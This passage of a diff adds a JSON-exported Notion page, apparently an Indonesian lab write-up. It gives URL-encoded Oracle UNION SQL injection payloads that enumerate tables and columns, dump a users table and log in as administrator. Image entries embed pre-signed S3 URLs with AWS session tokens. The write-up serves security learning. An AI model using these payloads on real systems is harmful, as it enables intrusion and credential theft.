+          "originalUrl": "https://prod-files-secure.s3.us-west-2.amazonaws.com/25667693-cef6-45e6-a695-79b59f50105b/ce016d1b-d219-486a-8213-870e7ef2175e/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4663COH4ZUY%2F20250918%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250918T013847Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDgaCXVzLXdlc3QtMiJGMEQCIHnxgj8bjnZBF8yKUPsadN3%2BJyIRCZyNHT21DkqeIZv2AiAWJbz%2FbOENbuYyRaCBYPnn5mVv%2F54FUYtHwmyono1L5iqIBAix%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMxG4%2B3Ni3byWE0Q7JKtwDlDuMy5UIBpB96TmayQwk91eI3wPp34sCNphOJCEYwttYEInhAYLLphSbUdA3QyalfcVu9D6UxgJLfwAqfqq5A%2B6vuW6SOp4qs63DyjndUFLkxCnm4k5RbWXtrh4fEwChR%2F1yQ8IAG5zR7tL%2FFYHkvpbmzo8wHu6W7Hmsrf8ps7bGXjOHJXJ1e3CyX6WN1EtJlexAcKjFiEH8WbfLP0%2Bv9v35OV48V5D5bnHOWBIOb4ZScPyo%2BGUUb8LzD2LhWVX6P%2B3Y7%2B4Rx5XKWB8tq%2FrsD%2FCKPX5vw8VTeUHCO56cn2fw%2FgyPxG7tNbQbRI0YdR2KHjOmVeNEroHloWsuICs0a8b%2FdkDa9H%2FCqERfys7lLcDcUY36IgN8o3Nm3RUUhHZHR0%2BJIsGamojjWL2nckg%2FRtJyhGym1qKHV4%2FJV%2FRd%2BJCVeXKbDTfgRXPzvglfluYvUab3SZk1KX2VF%2FpJYiVNLRdGnfiWiIHW43i6FaxZADWILY6ppkonPoAW8AxNx5Oa2j9APEL8577zAoPvkxNgc9UHybjWk3FIjhcO7jS3qxqd9W%2Fy3XszTP1g91YCHB1FxlCjtOkD969Z8cAOvvzeJvdb93m9Ey41Nr54118eOmUVdwV9kYGRXuy868ww4ZitxgY6pgGWBGkvquDHE0cie1dcBvWgU9Wzk0GRIzMbs%2FFR0v0MMYoap6lafAUVW3bxbGuFJ2h74%2B8j8pnASZ9zLB5hazCzUyVVg2w6bhXIbXwEwl%2BacfGPwUOsfQ7Rgoh03suQFfNzVwd8TleUB6H6gbawhtRpkei3rqU%2BMcaX24nKs44sXN6JoueFvaBKmRzBy6fQaObYLB8LCFJf2MWKv16xH1UB3L0VbXlO&X-Amz-Signature=10de14913fd4152b93bc642e1b7a295986b86551db60720a690ffe5f811099d8&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"
+        }
+      },
+      {
+        "id": "25cdb469-a81d-8096-b9a4-c3cbe6842788",
+        "type": "paragraph",
+        "created_time": "2025-08-27T14:01:00.000Z",
+        "last_edited_time": "2025-08-27T15:17:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Atau sekalian tampilkan ",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": "owner.table",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": true,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": " biar jelas: (tidak perlu)",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "25cdb469-a81d-801a-a85e-f82a133fad6d",
+        "type": "code",
+        "created_time": "2025-08-27T15:04:00.000Z",
+        "last_edited_time": "2025-08-27T15:04:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "'+UNION+ALL+SELECT+owner||'.'||table_name,NULL+FROM+all_tables+WHERE+owner+NOT+IN+('SYS','SYSTEM')--",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "language": "bash",
+          "caption": []
+        }
+      },
+      {
+        "id": "25cdb469-a81d-80f4-9834-dc10bcf99c99",
+        "type": "paragraph",
+        "created_time": "2025-08-27T15:04:00.000Z",
+        "last_edited_time": "2025-08-27T15:17:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Terlihat ada tabel user ",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": "USERS_QKSVLK",
+              "annotations": {
+                "bold": true,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "25cdb469-a81d-80b5-813e-f4611a7f8715",
+        "type": "heading_2",
+        "created_time": "2025-08-27T15:04:00.000Z",
+        "last_edited_time": "2025-08-27T15:04:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "3. Cek kolom tabel kandidat user",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default",
+          "is_toggleable": false
+        }
+      },
+      {
+        "id": "25cdb469-a81d-8017-8633-d0377a4bdfbe",
+        "type": "paragraph",
+        "created_time": "2025-08-27T15:04:00.000Z",
+        "last_edited_time": "2025-08-27T15:04:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Target kita: kolom yang menyimpan ",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": "username",
+              "annotations": {
+                "bold": true,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": " & ",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": "password",
+              "annotations": {
+                "bold": true,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": ". Ingat: di dictionary, nama tabel uppercase.",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "25cdb469-a81d-8084-9f19-d67575e78c1c",
+        "type": "code",
+        "created_time": "2025-08-27T15:05:00.000Z",
+        "last_edited_time": "2025-08-27T15:05:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "'+UNION+ALL+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name=UPPER('users_xxxxxx')--",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "language": "bash",
+          "caption": []
+        }
+      },
+      {
+        "id": "25cdb469-a81d-8077-8ae7-cd02482f2b7d",
+        "type": "image",
+        "created_time": "2025-08-27T15:19:00.000Z",
+        "last_edited_time": "2025-08-27T15:19:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "caption": [],
+          "type": "file",
+          "url": "/posts/day-9-lab-sql-injection-attack-listing-the-databas-25cdb469a81d8058aa2dee98ac891197/image-4.png",
+          "expiry_time": "2025-09-18T02:38:47.378Z",
+          "localUrl": "/posts/day-9-lab-sql-injection-attack-listing-the-databas-25cdb469a81d8058aa2dee98ac891197/image-4.png",
+          "originalUrl": "https://prod-files-secure.s3.us-west-2.amazonaws.com/25667693-cef6-45e6-a695-79b59f50105b/17f416d7-9e93-4c1e-aa2f-593cdd1270ae/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4663COH4ZUY%2F20250918%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250918T013847Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDgaCXVzLXdlc3QtMiJGMEQCIHnxgj8bjnZBF8yKUPsadN3%2BJyIRCZyNHT21DkqeIZv2AiAWJbz%2FbOENbuYyRaCBYPnn5mVv%2F54FUYtHwmyono1L5iqIBAix%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMxG4%2B3Ni3byWE0Q7JKtwDlDuMy5UIBpB96TmayQwk91eI3wPp34sCNphOJCEYwttYEInhAYLLphSbUdA3QyalfcVu9D6UxgJLfwAqfqq5A%2B6vuW6SOp4qs63DyjndUFLkxCnm4k5RbWXtrh4fEwChR%2F1yQ8IAG5zR7tL%2FFYHkvpbmzo8wHu6W7Hmsrf8ps7bGXjOHJXJ1e3CyX6WN1EtJlexAcKjFiEH8WbfLP0%2Bv9v35OV48V5D5bnHOWBIOb4ZScPyo%2BGUUb8LzD2LhWVX6P%2B3Y7%2B4Rx5XKWB8tq%2FrsD%2FCKPX5vw8VTeUHCO56cn2fw%2FgyPxG7tNbQbRI0YdR2KHjOmVeNEroHloWsuICs0a8b%2FdkDa9H%2FCqERfys7lLcDcUY36IgN8o3Nm3RUUhHZHR0%2BJIsGamojjWL2nckg%2FRtJyhGym1qKHV4%2FJV%2FRd%2BJCVeXKbDTfgRXPzvglfluYvUab3SZk1KX2VF%2FpJYiVNLRdGnfiWiIHW43i6FaxZADWILY6ppkonPoAW8AxNx5Oa2j9APEL8577zAoPvkxNgc9UHybjWk3FIjhcO7jS3qxqd9W%2Fy3XszTP1g91YCHB1FxlCjtOkD969Z8cAOvvzeJvdb93m9Ey41Nr54118eOmUVdwV9kYGRXuy868ww4ZitxgY6pgGWBGkvquDHE0cie1dcBvWgU9Wzk0GRIzMbs%2FFR0v0MMYoap6lafAUVW3bxbGuFJ2h74%2B8j8pnASZ9zLB5hazCzUyVVg2w6bhXIbXwEwl%2BacfGPwUOsfQ7Rgoh03suQFfNzVwd8TleUB6H6gbawhtRpkei3rqU%2BMcaX24nKs44sXN6JoueFvaBKmRzBy6fQaObYLB8LCFJf2MWKv16xH1UB3L0VbXlO&X-Amz-Signature=8047d4981e8add1663c42d14f10ecf35039a2843b268def0a74f80cebaec134a&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"
+        }
+      },
+      {
+        "id": "25cdb469-a81d-80dc-aec3-ec8e34a39f44",
+        "type": "paragraph",
+        "created_time": "2025-08-27T15:05:00.000Z",
+        "last_edited_time": "2025-08-27T15:21:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Nah dari hasil payload tadi, kelihatan 3 kolom. ",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": "Saya",
+              "annotations": {
+                "bold": true,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": " biasanya catat semuanya, tapi ",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": "fokus",
+              "annotations": {
+                "bold": true,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": " ke dua kolom yang kita butuhkan: ",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": "USERNAME_ACKIHT",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": true,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": " dan ",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": "PASSWORD_XYKCXP",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": true,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": ".",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "25cdb469-a81d-80f8-b20b-fb7ea36b7793",
+        "type": "paragraph",
+        "created_time": "2025-08-27T15:19:00.000Z",
+        "last_edited_time": "2025-08-27T15:22:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Tips: kalau mau hunting cepat tanpa tau nama tabel pastinya, bisa cari tabel yang ",
+              "annotations": {
+                "bold": false,
+                "italic": true,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": "punya keduanya",
+              "annotations": {
+                "bold": true,
+                "italic": true,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": ":",
+              "annotations": {
+                "bold": false,
+                "italic": true,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "25cdb469-a81d-8061-b230-d799df2ced44",
+        "type": "code",
+        "created_time": "2025-08-27T15:22:00.000Z",
+        "last_edited_time": "2025-08-27T15:22:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "'+UNION+ALL+SELECT+table_name,NULL+FROM+all_tab_columns+WHERE+owner=USER+AND+column_name+IN+('USERNAME','PASSWORD')+GROUP+BY+table_name+HAVING+COUNT(*)=2--",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "language": "bash",
+          "caption": []
+        }
+      },
+      {
+        "id": "25cdb469-a81d-800f-bbc2-e7ec06610368",
+        "type": "heading_2",
+        "created_time": "2025-08-27T15:22:00.000Z",
+        "last_edited_time": "2025-08-27T15:22:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Dump kredensial",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default",
+          "is_toggleable": false
+        }
+      },
+      {
+        "id": "25cdb469-a81d-801d-8389-f9242c78d02e",
+        "type": "paragraph",
+        "created_time": "2025-08-27T15:22:00.000Z",
+        "last_edited_time": "2025-08-27T15:22:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Kalau output UI kamu nampilin ",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": "dua kolom",
+              "annotations": {
+                "bold": true,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": ", ambil dua kolom itu sekaligus:",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "25cdb469-a81d-805e-b5f7-ea8010c96f3a",
+        "type": "code",
+        "created_time": "2025-08-27T15:23:00.000Z",
+        "last_edited_time": "2025-08-27T15:24:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "'+UNION+ALL+SELECT+USERNAME_ACKIHT,PASSWORD_XYKCXP+FROM+USERS_QKSVLK--",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "language": "bash",
+          "caption": []
+        }
+      },
+      {
+        "id": "25cdb469-a81d-8024-a776-df50f20aaaaf",
+        "type": "image",
+        "created_time": "2025-08-27T15:26:00.000Z",
+        "last_edited_time": "2025-08-27T15:26:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "caption": [],
+          "type": "file",
+          "url": "/posts/day-9-lab-sql-injection-attack-listing-the-databas-25cdb469a81d8058aa2dee98ac891197/image-5.png",
+          "expiry_time": "2025-09-18T02:38:47.406Z",
+          "localUrl": "/posts/day-9-lab-sql-injection-attack-listing-the-databas-25cdb469a81d8058aa2dee98ac891197/image-5.png",
+          "originalUrl": "https://prod-files-secure.s3.us-west-2.amazonaws.com/25667693-cef6-45e6-a695-79b59f50105b/ab5250bc-7195-4931-ba9a-2a25dad295eb/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4663COH4ZUY%2F20250918%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250918T013847Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDgaCXVzLXdlc3QtMiJGMEQCIHnxgj8bjnZBF8yKUPsadN3%2BJyIRCZyNHT21DkqeIZv2AiAWJbz%2FbOENbuYyRaCBYPnn5mVv%2F54FUYtHwmyono1L5iqIBAix%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMxG4%2B3Ni3byWE0Q7JKtwDlDuMy5UIBpB96TmayQwk91eI3wPp34sCNphOJCEYwttYEInhAYLLphSbUdA3QyalfcVu9D6UxgJLfwAqfqq5A%2B6vuW6SOp4qs63DyjndUFLkxCnm4k5RbWXtrh4fEwChR%2F1yQ8IAG5zR7tL%2FFYHkvpbmzo8wHu6W7Hmsrf8ps7bGXjOHJXJ1e3CyX6WN1EtJlexAcKjFiEH8WbfLP0%2Bv9v35OV48V5D5bnHOWBIOb4ZScPyo%2BGUUb8LzD2LhWVX6P%2B3Y7%2B4Rx5XKWB8tq%2FrsD%2FCKPX5vw8VTeUHCO56cn2fw%2FgyPxG7tNbQbRI0YdR2KHjOmVeNEroHloWsuICs0a8b%2FdkDa9H%2FCqERfys7lLcDcUY36IgN8o3Nm3RUUhHZHR0%2BJIsGamojjWL2nckg%2FRtJyhGym1qKHV4%2FJV%2FRd%2BJCVeXKbDTfgRXPzvglfluYvUab3SZk1KX2VF%2FpJYiVNLRdGnfiWiIHW43i6FaxZADWILY6ppkonPoAW8AxNx5Oa2j9APEL8577zAoPvkxNgc9UHybjWk3FIjhcO7jS3qxqd9W%2Fy3XszTP1g91YCHB1FxlCjtOkD969Z8cAOvvzeJvdb93m9Ey41Nr54118eOmUVdwV9kYGRXuy868ww4ZitxgY6pgGWBGkvquDHE0cie1dcBvWgU9Wzk0GRIzMbs%2FFR0v0MMYoap6lafAUVW3bxbGuFJ2h74%2B8j8pnASZ9zLB5hazCzUyVVg2w6bhXIbXwEwl%2BacfGPwUOsfQ7Rgoh03suQFfNzVwd8TleUB6H6gbawhtRpkei3rqU%2BMcaX24nKs44sXN6JoueFvaBKmRzBy6fQaObYLB8LCFJf2MWKv16xH1UB3L0VbXlO&X-Amz-Signature=85f1e93c4243d0da51d6726a56ccbf03c80d1794145bb63943b0f510ce98e5db&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"
+        }
+      },
+      {
+        "id": "25cdb469-a81d-8028-8d31-c517712a6487",
+        "type": "paragraph",
+        "created_time": "2025-08-27T15:24:00.000Z",
+        "last_edited_time": "2025-08-27T15:25:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Gotcha! terlihat ada username administrator dan juga passwordnya",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "25cdb469-a81d-807a-8442-f354a4ff95ae",
+        "type": "paragraph",
+        "created_time": "2025-08-27T15:29:00.000Z",
+        "last_edited_time": "2025-08-27T15:29:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "25cdb469-a81d-8033-ad0a-fdb32f7aafa4",
+        "type": "heading_2",
+        "created_time": "2025-08-27T15:29:00.000Z",
+        "last_edited_time": "2025-08-27T15:30:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Login",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default",
+          "is_toggleable": false
+        }
+      },
+      {
+        "id": "25cdb469-a81d-80d6-84f8-c7c442565bfa",
+        "type": "paragraph",
+        "created_time": "2025-08-27T15:30:00.000Z",
+        "last_edited_time": "2025-08-27T15:30:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Ambil kredensial ",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": "administrator",
+              "annotations": {
+                "bold": true,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": " dari dump tadi → masuk ke halaman login",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "25cdb469-a81d-80ad-a6a0-d5222ea991b6",
+        "type": "image",
+        "created_time": "2025-08-27T15:29:00.000Z",
+        "last_edited_time": "2025-08-27T15:29:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "caption": [],
+          "type": "file",
+          "url": "/posts/day-9-lab-sql-injection-attack-listing-the-databas-25cdb469a81d8058aa2dee98ac891197/image-6.png",
+          "expiry_time": "2025-09-18T02:38:47.407Z",
+          "localUrl": "/posts/day-9-lab-sql-injection-attack-listing-the-databas-25cdb469a81d8058aa2dee98ac891197/image-6.png",
+          "originalUrl": "https://prod-files-secure.s3.us-west-2.amazonaws.com/25667693-cef6-45e6-a695-79b59f50105b/e35a492d-62b3-4ae5-9b5e-2b61cd1c9e95/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4663COH4ZUY%2F20250918%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250918T013847Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDgaCXVzLXdlc3QtMiJGMEQCIHnxgj8bjnZBF8yKUPsadN3%2BJyIRCZyNHT21DkqeIZv2AiAWJbz%2FbOENbuYyRaCBYPnn5mVv%2F54FUYtHwmyono1L5iqIBAix%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMxG4%2B3Ni3byWE0Q7JKtwDlDuMy5UIBpB96TmayQwk91eI3wPp34sCNphOJCEYwttYEInhAYLLphSbUdA3QyalfcVu9D6UxgJLfwAqfqq5A%2B6vuW6SOp4qs63DyjndUFLkxCnm4k5RbWXtrh4fEwChR%2F1yQ8IAG5zR7tL%2FFYHkvpbmzo8wHu6W7Hmsrf8ps7bGXjOHJXJ1e3CyX6WN1EtJlexAcKjFiEH8WbfLP0%2Bv9v35OV48V5D5bnHOWBIOb4ZScPyo%2BGUUb8LzD2LhWVX6P%2B3Y7%2B4Rx5XKWB8tq%2FrsD%2FCKPX5vw8VTeUHCO56cn2fw%2FgyPxG7tNbQbRI0YdR2KHjOmVeNEroHloWsuICs0a8b%2FdkDa9H%2FCqERfys7lLcDcUY36IgN8o3Nm3RUUhHZHR0%2BJIsGamojjWL2nckg%2FRtJyhGym1qKHV4%2FJV%2FRd%2BJCVeXKbDTfgRXPzvglfluYvUab3SZk1KX2VF%2FpJYiVNLRdGnfiWiIHW43i6FaxZADWILY6ppkonPoAW8AxNx5Oa2j9APEL8577zAoPvkxNgc9UHybjWk3FIjhcO7jS3qxqd9W%2Fy3XszTP1g91YCHB1FxlCjtOkD969Z8cAOvvzeJvdb93m9Ey41Nr54118eOmUVdwV9kYGRXuy868ww4ZitxgY6pgGWBGkvquDHE0cie1dcBvWgU9Wzk0GRIzMbs%2FFR0v0MMYoap6lafAUVW3bxbGuFJ2h74%2B8j8pnASZ9zLB5hazCzUyVVg2w6bhXIbXwEwl%2BacfGPwUOsfQ7Rgoh03suQFfNzVwd8TleUB6H6gbawhtRpkei3rqU%2BMcaX24nKs44sXN6JoueFvaBKmRzBy6fQaObYLB8LCFJf2MWKv16xH1UB3L0VbXlO&X-Amz-Signature=26d342052c51d976e06e1ae6331a96fb8dd0b0ba88dbdbacbb0b55392308c2a5&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"
+        }
+      },
+      {
+        "id": "25cdb469-a81d-80af-bd72-f201d81659cd",
+        "type": "paragraph",
+        "created_time": "2025-08-27T15:24:00.000Z",
+        "last_edited_time": "2025-08-27T15:31:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "daann yupss! solved",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "25cdb469-a81d-8067-853f-e6fcff9b5dc4",
+        "type": "image",
+        "created_time": "2025-08-27T15:31:00.000Z",
+        "last_edited_time": "2025-08-27T15:31:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "caption": [],
+          "type": "file",
+          "url": "/posts/day-9-lab-sql-injection-attack-listing-the-databas-25cdb469a81d8058aa2dee98ac891197/image-7.png",
+          "expiry_time": "2025-09-18T02:38:47.407Z",
+          "localUrl": "/posts/day-9-lab-sql-injection-attack-listing-the-databas-25cdb469a81d8058aa2dee98ac891197/image-7.png",
+          "originalUrl": "https://prod-files-secure.s3.us-west-2.amazonaws.com/25667693-cef6-45e6-a695-79b59f50105b/5d7ff884-c4c9-46b1-bdff-be6aed228e42/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4663COH4ZUY%2F20250918%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250918T013847Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDgaCXVzLXdlc3QtMiJGMEQCIHnxgj8bjnZBF8yKUPsadN3%2BJyIRCZyNHT21DkqeIZv2AiAWJbz%2FbOENbuYyRaCBYPnn5mVv%2F54FUYtHwmyono1L5iqIBAix%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMxG4%2B3Ni3byWE0Q7JKtwDlDuMy5UIBpB96TmayQwk91eI3wPp34sCNphOJCEYwttYEInhAYLLphSbUdA3QyalfcVu9D6UxgJLfwAqfqq5A%2B6vuW6SOp4qs63DyjndUFLkxCnm4k5RbWXtrh4fEwChR%2F1yQ8IAG5zR7tL%2FFYHkvpbmzo8wHu6W7Hmsrf8ps7bGXjOHJXJ1e3CyX6WN1EtJlexAcKjFiEH8WbfLP0%2Bv9v35OV48V5D5bnHOWBIOb4ZScPyo%2BGUUb8LzD2LhWVX6P%2B3Y7%2B4Rx5XKWB8tq%2FrsD%2FCKPX5vw8VTeUHCO56cn2fw%2FgyPxG7tNbQbRI0YdR2KHjOmVeNEroHloWsuICs0a8b%2FdkDa9H%2FCqERfys7lLcDcUY36IgN8o3Nm3RUUhHZHR0%2BJIsGamojjWL2nckg%2FRtJyhGym1qKHV4%2FJV%2FRd%2BJCVeXKbDTfgRXPzvglfluYvUab3SZk1KX2VF%2FpJYiVNLRdGnfiWiIHW43i6FaxZADWILY6ppkonPoAW8AxNx5Oa2j9APEL8577zAoPvkxNgc9UHybjWk3FIjhcO7jS3qxqd9W%2Fy3XszTP1g91YCHB1FxlCjtOkD969Z8cAOvvzeJvdb93m9Ey41Nr54118eOmUVdwV9kYGRXuy868ww4ZitxgY6pgGWBGkvquDHE0cie1dcBvWgU9Wzk0GRIzMbs%2FFR0v0MMYoap6lafAUVW3bxbGuFJ2h74%2B8j8pnASZ9zLB5h